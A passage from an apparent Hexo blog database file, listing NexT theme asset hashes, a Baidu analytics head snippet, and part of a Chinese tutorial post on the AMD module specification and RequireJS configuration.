45469","modified":1491666751404},{"_id":"themes/next/layout/_third-party/search/tinysou.swig","hash":"fe95dd3d166634c466e19aa756e65ad6e8254d3e","modified":1491666751406},{"_id":"themes/next/layout/_third-party/seo/baidu-push.swig","hash":"d8c98938719284fa06492c114d99a1904652a555","modified":1491666751409},{"_id":"themes/next/.git/refs/heads/master","hash":"929f0a39f61901b4b7ead241fc06f16e4584928a","modified":1491666751151},{"_id":"themes/next/source/css/_mixins/Pisces.styl","hash":"a0f23e75a137d8c996c70e2059e0074f1e97a127","modified":1491666751529},{"_id":"themes/next/source/css/_mixins/base.styl","hash":"531934ea21ef4dc9f0978512050f54834f0a6cff","modified":1491666751530},{"_id":"themes/next/source/css/_custom/custom.styl","hash":"3403fdd8efde1a0afd11ae8a5a97673f5903087f","modified":1491666751527},{"_id":"themes/next/source/css/_variables/Mist.styl","hash":"e55265c8a8a6ae0c3c08e3509de92ee62c3cb5f6","modified":1491666751549},{"_id":"themes/next/source/css/_variables/Pisces.styl","hash":"09534b68bd1a708729b3cfffe17737e3af457757","modified":1491666751551},{"_id":"themes/next/source/css/_variables/base.styl","hash":"5b336489316d5efea069fe8bcea4479b53ec7545","modified":1491666751551},{"_id":"themes/next/source/js/src/affix.js","hash":"1b509c3b5b290a6f4607f0f06461a0c33acb69b1","modified":1491666751567},{"_id":"themes/next/source/js/src/algolia-search.js","hash":"cb431b54ba9c692165a1f5a12e4c564a560f8058","modified":1491666751568},{"_id":"themes/next/source/js/src/bootstrap.js","hash":"0ec035e20d1f26bf553a79877180ba312bea885c","modified":1491666751568},{"_id":"themes/next/source/js/src/exturl.js","hash":"a2a0f0de07e46211f74942a468f42ee270aa555c","modified":1491666751569},{"_id":"themes/next/source/js/src/hook-duoshuo.js","hash":"b35a7dc47b634197b93487cea8671a40a9fdffce","modified":1491666751570},{"_id":"themes/next/source/js/src/motion.js","hash":"ff9ea37d05c269e3a140c4ab448af03efc4bcc76","modified":1491666751570},{"_id":"themes/next/source/js/src/post-details.js","hash":"bfaf52b69aad96566aa21b785973441a2555b4ba","modified":1491666751571},{"_id":"themes/next/source/js/src/scrollspy.js","hash":"b7657be25fc52ec67c75ab5481bdcb483573338b","modified":1491666751573},{"_id":"themes/next/source/js/src/utils.js","hash":"988f29f78e68fa184c4412b722f5895fa78a4783","modified":1491666751574},{"_id":"themes/next/source/lib/algolia-instant-search/instantsearch.min.css","hash":"90ef19edc982645b118b095615838d9c5eaba0de","modified":1491666751576},{"_id":"themes/next/source/lib/canvas-nest/canvas-nest.min.js","hash":"0387e75e23b1db108a755073fe52a0d03eb391a7","modified":1491666751582},{"_id":"themes/next/source/lib/fancybox/.bower.json","hash":"9be892a4e14e0da18ff9cb962c9ef71f163b1b22","modified":1491666751583},{"_id":"themes/next/source/lib/fancybox/.gitattributes","hash":"672d3b5767e0eacd83bb41b188c913f2cf754793","modified":1491666751584},{"_id":"themes/next/source/lib/fastclick/.bower.json","hash":"bf3eef9d647cd7c9b62feda3bc708c6cdd7c0877","modified":1491666751598},{"_id":"themes/next/source/lib/fastclick/LICENSE","hash":"6f474ea75c42442da7bbcf2e9143ce98258efd8d","modified":1491666751599},{"_id":"themes/next/source/lib/fastclick/README.md","hash":"68a9b9d53126405b0fa5f3324f1fb96dbcc547aa","modified":1491666751599},{"_id":"themes/next/source/lib/fastclick/bower.json","hash":"a9b3ee1e4db71a0e4ea6d5bed292d176dd68b261","modified":1491666751600},{"_id":"themes/next/source/lib/jquery/.bower.json","hash":"865d6c1328ab209a4376b9d2b7a7824369565f28","modified":1491666751629},{"_id":"themes/next/source/lib/font-awesome/.bower.json","hash":"b4aefc910578d76b267e86dfffdd5121c8db9aec","modified":1491666751603},{"_id":"themes/next/source/lib/font-awesome/.gitignore","hash":"03ddbf76c1dd1afb93eed0b670d2eee747472ef1","modified":1491666751604},{"_id":"themes/next/source/lib/font-awesome/.npmignore","hash":"c31ff06a740955e44edd4403902e653ccabfd4db","modified":1491666751605},{"_id":"themes/next/source/lib/font-awesome/HELP-US-OUT.txt","hash":"ee33b2798b1e714b904d663436c6b3521011d1fa","modified":1491666751605},{"_id":"themes/next/source/lib/font-awesome/bower.json","hash":"71e7183634dc1b9449f590f15ebd7201add22ca7","modified":1491666751606},{"_id":"themes/next/.git/hooks/prepare-commit-msg.sample","hash":"2b6275eda365cad50d167fe3a387c9bc9fedd54f","modified":1491666732522},{"_id":"themes/next/source/lib/jquery_lazyload/.bower.json","hash":"90fa628f156d8045357ff11eaf32e61abacf10e8","modified":1491666751632},{"_id":"themes/next/source/lib/jquery_lazyload/CONTRIBUTING.md","hash":"4ded6fee668544778e97e38c2b211fc56c848e77","modified":1491666751633},{"_id":"themes/next/source/lib/jquery_lazyload/README.md","hash":"b930297cb98b8e1dbd5abe9bc1ed9d5935d18ce8","modified":1491666751634},{"_id":"themes/next/source/lib/jquery_lazyload/bower.json","hash":"e0acf1db27b0cc16128a59c46db1db406b5c4c58","modified":1491666751635},{"_id":"themes/next/source/lib/jquery_lazyload/jquery.lazyload.js","hash":"f4a570908f6c89c6edfb1c74959e733eaadea4f2","modified":1491666751635},{"_id":"themes/next/source/lib/jquery_lazyload/jquery.scrollstop.js","hash":"bf773ad48a0b9aa77681a89d7569eefc0f7b7b18","modified":1491666751636},{"_id":"themes/next/source/lib/three/three-waves.min.js","hash":"b070490e0588c4625e84bcd4f847dc6275a97a81","modified":1491666751638},{"_id":"themes/next/source/lib/velocity/.bower.json","hash":"63da5e80ebb61bb66a2794d5936315ca44231f0c","modified":1491666751648},{"_id":"themes/next/source/lib/velocity/bower.json","hash":"92d92860418c4216aa59eb4cb4a556290a7ad9c3","modified":1491666751648},{"_id":"themes/next/source/lib/velocity/velocity.min.js","hash":"bf172816a9c57f9040e3d19c24e181a142daf92b","modified":1491666751653},{"_id":"themes/next/source/lib/velocity/velocity.ui.js","hash":"dbbfb50f6502f6b81dcc9fee7b31f1e812da3464","modified":1491666751655},{"_id":"themes/next/source/lib/velocity/velocity.ui.min.js","hash":"dde584994ac13dc601836e86f4cf490e418d9723","modified":1491666751656},{"_id":"themes/next/.git/hooks/update.sample","hash":"e729cd61b27c128951d139de8e7c63d1a3758dde","modified":1491666732530},{"_id":"themes/next/source/lib/jquery/index.js","hash":"17a740d68a1c330876c198b6a4d9319f379f3af2","modified":1491666751631},{"_id":"themes/next/layout/_third-party/search/algolia-search/dom.swig","hash":"2530de0f3125a912756f6c0e9090cd012134a4c5","modified":1491666751400},{"_id":"themes/next/layout/_third-party/search/algolia-search/assets.swig","hash":"218cc936ba3518a3591b2c9eda46bc701edf7710","modified":1491666751398},{"_id":"themes/next/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1491666751132},{"_id":"themes/next/.git/logs/refs/heads/master","hash":"1000fed54eb268f8e2dbb75a491ad1afdb6f92b3","modified":1491666751159},{"_id":"themes/next/source/css/_common/components/back-to-top-sidebar.styl","hash":"4ba6f2a615693b9b5afc266d9c833697016085fd","modified":1491666751449},{"_id":"themes/next/source/css/_common/components/back-to-top.styl","hash":"1dc2ed435e41ca041f43bd9633d5d95139afbb42","modified":1491666751451},{"_id":"themes/next/source/css/_common/components/buttons.styl","hash":"22828f5141c0cecb9ef25a110e194cdfa3a36423","modified":1491666751452},{"_id":"themes/next/source/css/_common/components/comments.styl","hash":"ff4489cd582f518bba6909a301ac1292a38b4e96","modified":1491666751454},{"_id":"themes/next/source/css/_common/components/components.styl","hash":"7ad4081466b397e2a6204141bb7768b7c01bd93c","modified":1491666751455},{"_id":"themes/next/source/css/_common/components/pagination.styl","hash":"88559b13ce94311405b170a0506ded91273beceb","modified":1491666751486},{"_id":"themes/next/source/css/_common/components/tag-cloud.styl","hash":"6eb4bcc3056bd279d000607e8b4dad50d368ca69","modified":1491666751508},{"_id":"themes/next/source/css/_common/scaffolding/base.styl","hash":"4998bedff9c84a09a294b8ef36ede2e3644d3528","modified":1491666751523},{"_id":"themes/next/source/css/_common/outline/outline.styl","hash":"12662536c7a07fff548abe94171f34b768dd610f","modified":1491666751522},{"_id":"themes/next/source/css/_common/scaffolding/helpers.styl","hash":"1da5c800d025345f212a3bf1be035060f4e5e6ed","modified":1491666751524},{"_id":"themes/next/source/css/_common/scaffolding/normalize.styl","hash":"3f40e8a9fe8e7bd5cfc4cf4cbbbcb9539462e973","modified":1491666751524},{"_id":"themes/next/source/css/_common/scaffolding/scaffolding.styl","hash":"c9218b48c56e52c06af9ce3cc8fbdae737cf16fe","modified":1491666751525},{"_id":"themes/next/source/css/_common/scaffolding/tables.styl","hash":"ea9069645696f86c5df64208490876fe150c8cae","modified":1491666751526},{"_id":"themes/next/source/css/_schemes/Mist/_base.styl","hash":"25d5e45a355ee2093f3b8b8eeac125ebf3905026","modified":1491666751532},{"_id":"themes/next/source/css/_schemes/Mist/_header.styl","hash":"d0bfd1bef988c76f7d7dd72d88af6f0908a8b0db","modified":1491666751533},{"_id":"themes/next/source/css/_schemes/Mist/_logo.styl","hash":"b1025c421406d2c24cc92a02ae28c1915b01e240","modified":1491666751533},{"_id":"themes/next/source/css/_schemes/Mist/_menu.styl","hash":"26666c1f472bf5f3fb9bc62081cca22b4de15ccb","modified":1491666751534},{"_id":"themes/next/source/css/_schemes/Mist/_search.styl","hash":"09c965022c13b84ed8a661fee8ac2a6d550495ae","modified":1491666751535},{"_id":"themes/next/source/css/_schemes/Mist/_posts-expanded.styl","hash":"ce272226a1570f5f7c70243b751a5b0fe1671a88","modified":1491666751535},{"_id":"themes/next/source/css/_schemes/Mist/index.styl","hash":"9b913b73d31d21f057f97115ffab93cfa578b884","modified":1491666751537},{"_id":"themes/next/source/css/_schemes/Muse/_layout.styl","hash":"31127dcbf4c7b4ada53ffbf1638b5fe325b7cbc0","modified":1491666751540},{"_id":"themes/next/source/css/_schemes/Muse/_logo.styl","hash":"748dbfbf9c08e719ddc775958003c64b00d39dab","modified":1491666751540},{"_id":"themes/next/source/css/_schemes/Muse/_menu.styl","hash":"f23ac53ab901c48859dd29eee6e386b60ff956ba","modified":1491666751541},{"_id":"themes/next/source/css/_schemes/Muse/_search.styl","hash":"09c965022c13b84ed8a661fee8ac2a6d550495ae","modified":1491666751542},{"_id":"themes/next/source/css/_schemes/Muse/index.styl","hash":"5dbc0d0c897e46760e5dbee416530d485c747bba","modified":1491666751543},{"_id":"themes/next/source/css/_schemes/Pisces/_layout.styl","hash":"416988dca389e6e2fdfa51fa7f4ee07eb53f82fb","modified":1491666751546},{"_id":"themes/next/source/css/_schemes/Pisces/_brand.styl","hash":"bce344d3a665b4c55230d2a91eac2ad16d6f32fd","modified":1491666751545},{"_id":"themes/next/source/css/_schemes/Pisces/_posts.styl","hash":"1f6e2ce674735269599acc6d77b3ea18d31967fc","modified":1491666751547},{"_id":"themes/next/source/css/_schemes/Pisces/_menu.styl","hash":"4642e30010af8b2b037f5b43146b10a934941958","modified":1491666751546},{"_id":"themes/next/source/css/_schemes/Pisces/_sidebar.styl","hash":"c48d4a561d047b3705924949b3ab7b57bee94ecd","modified":1491666751548},{"_id":"themes/next/source/css/_schemes/Pisces/index.styl","hash":"86197902dfd3bededba10ba62b8f9f22e0420bde","modified":1491666751548},{"_id":"themes/next/source/js/src/schemes/pisces.js","hash":"c4358416f0a116d7f4037542fa3b385947e80908","modified":1491666751572},{"_id":"themes/next/source/lib/fancybox/source/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1491666751584},{"_id":"themes/next/source/lib/fancybox/source/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1491666751586},{"_id":"themes/next/source/lib/fancybox/source/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1491666751586},{"_id":"themes/next/source/lib/fancybox/source/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1491666751587},{"_id":"themes/next/source/lib/fancybox/source/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1491666751587},{"_id":"themes/next/source/lib/fancybox/source/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1491666751588},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.css","hash":"82f33ad0842aa9c154d029e0dada2497d4eb1d57","modified":1491666751594},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.js","hash":"d71602cbca33b9ecdb7ab291b7f86a49530f3601","modified":1491666751595},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.pack.js","hash":"ae6318aeb62ad4ce7a7e9a4cdacd93ffb004f0fb","modified":1491666751596},{"_id":"themes/next/source/lib/fastclick/lib/fastclick.js","hash":"1d6aeda0480d0e4cb6198edf7719d601d4ae2ccc","modified":1491666751601},{"_id":"themes/next/source/lib/fastclick/lib/fastclick.min.js","hash":"2cae0f5a6c5d6f3cb993015e6863f9483fc4de18","modified":1491666751602},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.css","hash":"3655f1fdf1e584c4d8e8d39026093ca306a5a341","modified":1491666751608},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.css.map","hash":"1573904b82807abbb32c97a3632c6c6808eaac50","modified":1491666751609},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.min.css","hash":"88af80502c44cd52ca81ffe7dc7276b7eccb06cf","modified":1491666751609},{"_id":"themes/next/source/lib/ua-parser-js/dist/ua-parser.min.js","hash":"41ea797c68dbcff2f6fb3aba1d1043a22e7cc0f6","modified":1491666751645},{"_id":"themes/next/source/lib/ua-parser-js/dist/ua-parser.pack.js","hash":"a817b6c158cbc5bab3582713de9fe18a18a80552","modified":1491666751646},{"_id":"themes/next/.git/objects/pack/pack-d2e689db66e027ccdba615b3076c463c3c28705d.idx","hash":"0c2e04ed21f69df5f0b65a1a241d861428690a3e","modified":1491666750705},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.woff","hash":"28b782240b3e76db824e12c02754a9731a167527","modified":1491666751627},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.woff2","hash":"d6f48cba7d076fb6f2fd6ba993a75b9dc1ecbf0c","modified":1491666751628},{"_id":"themes/next/source/lib/velocity/velocity.js","hash":"4237c6e9d59da349639de20e559e87c2c0218cfd","modified":1491666751652},{"_id":"themes/next/.git/logs/refs/remotes/origin/HEAD","hash":"1000fed54eb268f8e2dbb75a491ad1afdb6f92b3","modified":1491666751132},{"_id":"themes/next/source/css/_common/components/footer/footer.styl","hash":"4c4ef6e997d0c6e21de39c2daa0c768e12c8c6fa","modified":1491666751458},{"_id":"themes/next/source/css/_common/components/highlight/diff.styl","hash":"167986d0f649516671ddf7193eebba7b421cd115","modified":1491666751470},{"_id":"themes/next/source/css/_common/components/highlight/highlight.styl","hash":"b3b783511bbd94af7e941abf8ff411885db7395b","modified":1491666751472},{"_id":"themes/next/source/css/_common/components/highlight/theme.styl","hash":"7fe4d4d656e86276c17cb4e48a560cb6a4def703","modified":1491666751474},{"_id":"themes/next/source/css/_common/components/header/header.styl","hash":"53cde051e0337f4bf42fb8d6d7a79fa3fa6d4ef2","modified":1491666751461},{"_id":"themes/next/source/css/_common/components/header/headerband.styl","hash":"d63e0cacc53dd375fcc113465a4328c59ff5f2c1","modified":1491666751463},{"_id":"themes/next/source/css/_common/components/header/menu.styl","hash":"1a0d059799a298fe17c49a44298d32cebde93785","modified":1491666751464},{"_id":"themes/next/source/css/_common/components/header/site-meta.styl","hash":"0656e753f182c9f47fef7304c847b7587a85ef0d","modified":1491666751466},{"_id":"themes/next/source/css/_common/components/header/site-nav.styl","hash":"1727702eac5d326b5c81a667944a245016668231","modified":1491666751468},{"_id":"themes/next/source/css/_common/components/pages/archive.styl","hash":"104b5c79cd891506e0beaf938b083685f1da8637","modified":1491666751477},{"_id":"themes/next/source/css/_common/components/pages/categories.styl","hash":"7fb593f90d74a99c21840679933b9ef6fdc16a61","modified":1491666751479},{"_id":"themes/next/source/css/_common/components/pages/pages.styl","hash":"f9760ecf186954cee3ba4a149be334e9ba296b89","modified":1491666751481},{"_id":"themes/next/source/css/_common/components/pages/schedule.styl","hash":"8cf318644acc8b4978537c263290363e21c7f5af","modified":1491666751484},{"_id":"themes/next/source/css/_common/components/pages/post-detail.styl","hash":"4e3838d7ac81d9ad133960f0f7ed58a44a015285","modified":1491666751483},{"_id":"themes/next/source/css/_common/components/post/post-button.styl","hash":"4783f85872bc7e218c1522a5c1c68cd27a5922db","modified":1491666751487},{"_id":"themes/next/source/css/_common/components/post/post-collapse.styl","hash":"a45f5fce643eec4e1b927165229d560364bcace1","modified":1491666751488},{"_id":"themes/next/source/css/_common/components/post/post-copyright.styl","hash":"caf263d1928496688c0e1419801eafd7e6919ce5","modified":1491666751489},{"_id":"themes/next/source/css/_common/components/post/post-eof.styl","hash":"a200c0a1c5a895ac9dc41e0641a5dfcd766be99b","modified":1491666751490},{"_id":"themes/next/source/css/_common/components/post/post-expand.styl","hash":"fcd89ba4f6f48269e5caa73307e8689f41019896","modified":1491666751491},{"_id":"themes/next/source/css/_common/components/post/post-gallery.styl","hash":"cd9e214e502697f2f2db84eb721bac57a49b0fce","modified":1491666751492},{"_id":"themes/next/source/css/_common/components/post/post-meta.styl","hash":"61ec8a8481e8b76f2943235256c6d4f89c751c1c","modified":1491666751493},{"_id":"themes/next/source/css/_common/components/post/post-nav.styl","hash":"27deb3d3a243d30022055dac7dad851024099a8b","modified":1491666751494},{"_id":"themes/next/source/css/_common/components/post/post-reward.styl","hash":"8355b0e9375b3245508efda0e18acd069c2aa767","modified":1491666751495},{"_id":"themes/next/source/css/_common/components/post/post-tags.styl","hash":"5a982d8ef3b3623ea5f59e63728990f5623c1b57","modified":1491666751496},{"_id":"themes/next/source/css/_common/components/post/post-title.styl","hash":"350469437b20ecfd6f3ca45e400478f8e3f71cfb","modified":1491666751497},{"_id":"themes/next/source/css/_common/components/post/post-type.styl","hash":"01567edaea6978628aa5521a122a85434c418bfd","modified":1491666751498},{"_id":"themes/next/source/css/_common/components/post/post.styl","hash":"a497ea244df7dd97d1b961412b56f94cc4031e23","modified":1491666751499},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-author-links.styl","hash":"7f2bdd6109614d35408ee5ac3335aad4464c69c7","modified":1491666751500},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-author.styl","hash":"761eba9811b050b25d548cc0854de4824b41eb08","modified":1491666751501},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-blogroll.styl","hash":"ac060861b27b764bc4012fc362a25a332df4045a","modified":1491666751502},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-feed-link.styl","hash":"61f8cea3c01acd600e90e1bc2a07def405503748","modified":1491666751503},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-nav.styl","hash":"1153bb71edf253765145559674390e16dd67c633","modified":1491666751504},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-toc.styl","hash":"394888efec32749b353292a59ec7f1b609d6325e","modified":1491666751505},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-toggle.styl","hash":"c9f76d4f6806ef70fa2160c97afa0a0e0ae5373e","modified":1491666751506},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar.styl","hash":"702be9e57dd6ff5fa99642a1f6e3df26215b8805","modified":1491666751507},{"_id":"themes/next/source/css/_common/components/sidebar/site-state.styl","hash":"e71652d3216e289c8548b1ea2357822c1476a425","modified":1491666751508},{"_id":"themes/next/source/css/_common/components/tags/blockquote-center.styl","hash":"2fe76476432b31993338cb45cdb3b29a518b6379","modified":1491666751510},{"_id":"themes/next/source/css/_common/components/tags/exturl.styl","hash":"a3bdd71237afc112b2aa255f278cab6baeb25351","modified":1491666751511},{"_id":"themes/next/source/css/_common/components/tags/full-image.styl","hash":"3159b55f35c40bd08e55b00148c523760a708c51","modified":1491666751512},{"_id":"themes/next/source/css/_common/components/tags/group-pictures.styl","hash":"2ad1a2a9bbf6742d1b0762c4c623b68113d1e0fe","modified":1491666751513},{"_id":"themes/next/source/css/_common/components/tags/note.styl","hash":"8420b4be386469337243336aee694297875bd439","modified":1491666751514},{"_id":"themes/next/source/css/_common/components/tags/tags.styl","hash":"e3ad37f2da35e330616a044621ffa50565a20c88","modified":1491666751515},{"_id":"themes/next/source/css/_common/components/third-party/algolia-search.styl","hash":"bba4f3bdb7517cd85376df3e1209b570c0548c69","modified":1491666751516},{"_id":"themes/next/source/css/_common/components/third-party/baidushare.styl","hash":"5dbeed535d63a50265d96b396a5440f9bb31e4ba","modified":1491666751517},{"_id":"themes/next/source/css/_common/components/third-party/busuanzi-counter.styl","hash":"a6e7d698702c2e383dde3fde2abde27951679084","modified":1491666751517},{"_id":"themes/next/source/css/_common/components/third-party/duoshuo.styl","hash":"717cc7f82be9cc151e23a7678601ff2fd3a7fa1d","modified":1491666751518},{"_id":"themes/next/source/css/_common/components/third-party/gentie.styl","hash":"cd526e814f9323a79fe835085d64867d34b3715d","modified":1491666751519},{"_id":"themes/next/source/css/_common/components/third-party/jiathis.styl","hash":"15975ba7456b96916b1dbac448a1a0d2c38b8f3d","modified":1491666751519},{"_id":"themes/next/source/css/_common/components/third-party/localsearch.styl","hash":"6516b70ee9e44f1cf9443412cc31bcccb6cdb684","modified":1491666751520},{"_id":"themes/next/source/css/_common/components/third-party/third-party.styl","hash":"dc944a01dd59f5ed2d44bb22fdb21fc3f455948f","modified":1491666751521},{"_id":"themes/next/source/css/_schemes/Mist/outline/outline.styl","hash":"a07aa12cc36ac5c819670c2a3c17d07ed7a08986","modified":1491666751538},{"_id":"themes/next/source/css/_schemes/Mist/sidebar/sidebar-blogroll.styl","hash":"1f09be9bb38411f0629b58c3b23873589a6dbcaa","modified":1491666751539},{"_id":"themes/next/source/css/_schemes/Muse/sidebar/sidebar-blogroll.styl","hash":"1f09be9bb38411f0629b58c3b23873589a6dbcaa","modified":1491666751544},{"_id":"themes/next/source/lib/fancybox/source/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1491666751590},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-buttons.css","hash":"6394c48092085788a8c0ef72670b0652006231a1","modified":1491666751591},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-buttons.js","hash":"ee948b4489aedeb548a77c9e45d8c7c5732fd62d","modified":1491666751591},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-media.js","hash":"51139a4c79573d372a347ef01a493222a1eaf10a","modified":1491666751592},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-thumbs.css","hash":"b88b589f5f1aa1b3d87cc7eef34c281ff749b1ae","modified":1491666751592},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-thumbs.js","hash":"d22b1629cb23a6181bebb70d0cf653ffe4b835c8","modified":1491666751593},{"_id":"themes/next/source/lib/font-awesome/fonts/FontAwesome.otf","hash":"048707bc52ac4b6563aaa383bfe8660a0ddc908c","modified":1491666751613},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.eot","hash":"d980c2ce873dc43af460d4d572d441304499f400","modified":1491666751616},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.ttf","hash":"13b1eab65a983c7a73bc7997c479d66943f7c6cb","modified":1491666751625},{"_id":"themes/next/source/lib/algolia-instant-search/instantsearch.min.js","hash":"90a1b22129efc172e2dfcceeeb76bff58bc3192f","modified":1491666751581},{"_id":"themes/next/source/lib/three/three.min.js","hash":"26273b1cb4914850a89529b48091dc584f2c57b8","modified":1491666751644},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.svg","hash":"b5483b11f8ba213e733b5b8af9927a04fec996f6","modified":1491666751622},{"_id":"themes/next/.git/objects/pack/pack-d2e689db66e027ccdba615b3076c463c3c28705d.pack","hash":"63d22546f15f2e1ce9315fc721105f47853da8c3","modified":1491666750811}],"Category":[],"Data":[{"_id":"head","data":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}],"Page":[],"Post":[{"title":"【模块化JS】AMD规范","_content":"\nAsynchronous Module Definition——异步模块定义\n\n它是一个在浏览器端模块化开发的规范。由于不是Javascript原生支持，使用AMD规范进行页面开发需要用到对应的库函数——**RequireJS**\n\n![RequireJS图标](https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1485016792251&di=e0445002cd2ccabd9c130a8e12d4d1d2&imgtype=0&src=http%3A%2F%2Fwww.uedsc.com%2Fwp-content%2Fuploads%2F2015%2F08%2Frequirejs.jpg)\n\n#### RequireJS主要解决两个问题\n\n1. 多个js文件之间可能存在依赖关系时需要被依赖文件先备加载到浏览器\n2. js文件加载时，加载文件越多，页面失去响应时间越久\n\n<!-- more -->\n\n#### 语法简介\n\n*定义模块*——define([id], [dependencies], factory);\n\n它是全局变量，用于定义模块。\n\n* id：可选，用于定义模块标识。若没有提供该参数，则标识为脚本文件名\n* dependencies：可选，所依赖的模块\n* factory：模块初始化要执行的函数或对象。若为函数，则只被执行一次，若为对象，则此对象应为模块的输出值。\n\n\n*加载模块*——require([dependencies], callback);\n\n* dependencies：数组，表示所依赖的模块\n* callback：回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块。\n\n> 补充：require()函数在加载依赖的函数时是异步加载的，这样浏览器就不会失去响应，它指定的回调函数只有在前面的模块都加载成功后才会运行。由此解决依赖性问题。\n\n### 使用RequireJS\n\n#### 下载\n\n[下载链接](http://www.requirejs.cn/docs/download.html)\n\n#### 添加\n\n假定现在项目中所有js文件都放在一个\"scripts\"目录下，并添加上require.js。\n\n\t* 项目目录/\n\t  * project.html\n\t  * scripts/\n\t     * main.js\n\t     * *require.js*\n\t     * helper/\n\t         * util.js\n\n为了充分利用require.js建议只在HTML中引入require.js，然后通过它来请求加载其他的scripts：\n\n\t<!DOCTYPE html>\n\t<html>\n\t    <head>\n\t        <title>My Sample Project</title>\n\t        <!-- data-main attribute tells require.js to load scripts/main.js after require.js loads. -->\n\t        <script data-main=\"scripts/main\" src=\"scripts/require.js\"></script>\n\t    </head>\n\t    <body>\n\t        <h1>My Sample Project</h1>\n\t    </body>\n\t</html>\n\n* data-main属性：require.js使用它来启动脚本加载过程。\n\n> RequireJS以一个相对于baseUrl的地址来加载所有的代码。而baseUrl有三种方式可以设置。\n\n> 1. 使用上述data-main属性，可设置baseUrl为该属性相一致的目录。上例中为scripts文件夹\n2. 使用RequireJS 的config手动设置。比如在main.js头部添加\n\t\t \trequire.config({\n\t\t\t\tpaths: {\n\t\t\t    \t\tjsFileName: 'FileAddress'\n\t\t\t\t}\n\t\t\t});\n> 3. 如果没有显式指定上述二者，则默认为包含RequireJS的那个HTML页面所属目录。\n\n然后在main.js中使用require()来加载所有需要运行的scripts。\n\n\trequire([\"helper/util\"], function(util) {\n\t    //This function is called when scripts/helper/util.js is loaded.\n\t    //If util.js calls define(), then this function is not fired until\n\t    //util's dependencies have loaded, and the util argument will hold\n\t    //the module value for \"helper/util\".\n\t});\n\n#### 加载文件\n\n以加载一个jQuery库为例。之前都是加载本地js模块，若是需要加载来自本地服务器、其他网站或CDN的js，那么可以用如下方式：\n\n\trequire.config({\n\t    paths : {\n\t        \"jquery\" : [\"http://libs.baidu.com/jquery/2.0.3/jquery\"]   \n\t    }\n\t})\n\trequire([\"jquery\",\"js/a\"],function($){\n\t    $(function(){\n\t        alert(\"load finished\");  \n\t    })\n\t})\n\nrequire.config用来配置模块加载位置。简单点说就是给模块起一个更短更好记的名字，比如将百度的jquery库地址标记为jquery，这样在require时只需要写[\"jquery\"]就可以加载该js。当然，本地的js也可以这样配置。\n\n通过paths的配置会使我们的模块名字更精炼，paths还有一个重要的功能，就是可以配置多个路径，如果远程cdn库没有加载成功，可以加载本地的库，如：\n\n\trequire.config({\n\t    paths : {\n\t        \"jquery\" : [\"http://libs.baidu.com/jquery/2.0.3/jquery\", \"js/jquery\"],\n\t        \"a\" : \"js/a\"   \n\t    }\n\t})\n\trequire([\"jquery\",\"a\"],function($){\n\t    $(function(){\n\t        alert(\"load finished\");  \n\t    })\n\t})\n\n这样配置后，当百度的jquery没有加载成功后，会加载本地js目录下的jquery。\n\n1. 在使用requirejs时，加载模块时不用写.js后缀的，当然也是不能写后缀\n2. 上面例子中的callback函数中发现有$参数，这个就是依赖的jquery模块的输出变量，如果你依赖多个模块，可以依次写入多个参数来使用。\n\n事实上，一般把require.config配置放到data-main中配置，这样就可以使每一个页面都使用这个配置，然后页面中就可以直接使用require来加载所有的短模块名。\n\n*main.js*\n\n\trequire.config({\n\t    paths : {\n\t        \"jquery\" : [\"http://libs.baidu.com/jquery/2.0.3/jquery\", \"js/jquery\"],\n\t        \"a\" : \"js/a\"   \n\t    }\n\t})\n\n*project.html*\n\n\t<script data-main=\"js/main\" src=\"js/require.js\"></script>\n\n##### 加载第三方模块\n\n通过require加载的模块一般都需要符合AMD规范即使用define来申明模块，但是部分时候需要加载非AMD规范的js，这时候就需要用到另一个功能——shim\n\n主要用在两个地方\n\n1. 非AMD模块输出，将非标准的AMD模块\"垫\"成可用的模块，例如：老版本的jquery，并没有继承AMD规范，所以不能直接require[\"jquery\"],这时候就需要shim。比如我要是用underscore类库，但是他并没有实现AMD规范，那么可以这样配置：\n\n\t\trequire.config({\n\t\t    shim: {\n\t\t        \"underscore\" : {\n\t\t            exports : \"_\";\n\t\t    